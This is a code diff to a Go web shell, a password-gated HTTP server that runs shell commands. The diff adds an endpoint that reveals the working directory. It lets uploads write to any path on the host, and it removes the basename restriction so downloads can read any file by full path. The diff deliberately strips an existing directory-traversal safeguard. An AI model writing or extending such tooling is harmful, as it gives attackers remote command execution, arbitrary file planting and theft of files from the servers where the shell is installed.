@@ -31,6 +31,24 @@ func handleRoot(c *gin.Context) {
 	c.String(http.StatusOK, pages.GetWebShellHTML())
 }
 
+// 返回当前工作目录（带 key 验证）
+func handleGetCurrentPath(c *gin.Context) {
+	key := c.Query("key")
+	if key != password {
+		c.String(http.StatusUnauthorized, "Unauthorized")
+		return
+	}
+
+	dir, err := os.Getwd()
+	if err != nil {
+		c.String(http.StatusInternalServerError, fmt.Sprintf("获取当前目录失败: %v", err))
+		return
+	}
+
+	c.Header("Content-Type", "text/plain; charset=utf-8")
+	c.String(http.StatusOK, dir)
+}
+
 // 处理GET请求执行shell命令
 func handleGet(c *gin.Context) {
 	// 验证密钥
@@ -116,13 +134,11 @@ func handlePost(c *gin.Context) {
 }
 
 // 处理文件上传
-// 上传使用 multipart/form-data，key 可以放在 query 或 form field 中（优先检查 query）
+// 上传使用 multipart/form-data，支持 path 字段（目标全路径或目录）
 func handleFileSend(c *gin.Context) {
 	// 优先从 query 获取 key
 	key := c.Query("key")
 	if key != password {
-		// 如果 query 中没有或不匹配，尝试从 form 字段中读取（兼容 multipart/form-data）
-		// 使用 c.Request.MultipartReader 读取表单字段，但为了简单起见，如果 query 不存在则返回 Unauthorized
 		c.String(http.StatusUnauthorized, "Unauthorized")
 		return
 	}
@@ -136,6 +152,7 @@ func handleFileSend(c *gin.Context) {
 
 	ctx := c.Request.Context()
 	var savedFiles []string
+	var destPath string // 来自表单的目标路径（可以是目录或完整路径）
 	defer func() {
 		// 在处理完毕若发生 panic/错误，清理已写入的临时文件（如果需要）
 		if r := recover(); r != nil {
@@ -146,7 +163,7 @@ func handleFileSend(c *gin.Context) {
 		}
 	}()
 
-	// 只处理第一个文件字段（常见场景），如果需要支持多个文件可循环处理
+	// 处理 multipart 各部分，支持普通字段和文件字段
 	for {
 		part, perr := mr.NextPart()
 		if perr == io.EOF {
@@ -162,18 +179,44 @@ func handleFileSend(c *gin.Context) {
 		}
 
 		if part.FileName() == "" {
-			// 普通表单字段，忽略（key 我们已通过 query 校验）
+			// 普通表单字段，读取内容
+			name := part.FormName()
+			data, _ := io.ReadAll(part)
 			_ = part.Close()
+			val := strings.TrimSpace(string(data))
+			if name == "path" {
+				destPath = val
+			}
 			continue
 		}
 
 		// 文件字段
 		filename := filepath.Base(part.FileName())
-		// 将文件保存在当前工作目录下，保留原始文件名（可按需修改为特定目录）
-		outPath := filename
+
+		// 计算输出路径：如果表单指定了 destPath
+		var outPath string
+		if destPath == "" {
+			outPath = filename
+		} else {
+			// 如果 destPath 指向一个已存在的目录或以路径分隔符结尾，则把文件名追加到目录
+			if fi, err := os.Stat(destPath); err == nil && fi.IsDir() {
+				outPath = filepath.Join(destPath, filename)
+			} else if strings.HasSuffix(destPath, string(os.PathSeparator)) {
+				outPath = filepath.Join(destPath, filename)
+			} else {
+				// 否则把 destPath 当作完整文件路径（覆盖或创建）
+				outPath = destPath
+			}
+		}
+
+		// 确保目标目录存在
+		if dir := filepath.Dir(outPath); dir != "" {
+			_ = os.MkdirAll(dir, 0755)
+		}
+
 		outFile, ferr := os.Create(outPath)
 		if ferr != nil {
-			_ = part.Close()
+			part.Close()
 			for _, f := range savedFiles {
 				_ = os.Remove(f)
 			}
@@ -218,7 +261,7 @@ func handleFileSend(c *gin.Context) {
 		}
 
 		_ = outFile.Close()
-		// 仅处理第一个文件（如果有多个文件部分，可继续循环）
+		// 如果只需要处理第一个文件则可以 break，否则继续
 		break
 	}
 
@@ -228,7 +271,7 @@ func handleFileSend(c *gin.Context) {
 }
 
 // 处理文件下载
-// 请求示例: /file_receive?key=xxx&path=filename
+// 请求示例: /file_receive?key=xxx&path=/full/path/to/file
 func handleFileReceive(c *gin.Context) {
 	// 验证密钥
 	key := c.Query("key")
@@ -243,9 +286,7 @@ func handleFileReceive(c *gin.Context) {
 		return
 	}
 
-	// 安全处理: 只使用文件名，禁止目录遍历
-	filePath = filepath.Base(filePath)
-
+	// 不再限制为 basename，支持传入全路径（请注意安全）
 	// 打开文件
 	f, err := os.Open(filePath)
 	if err != nil {
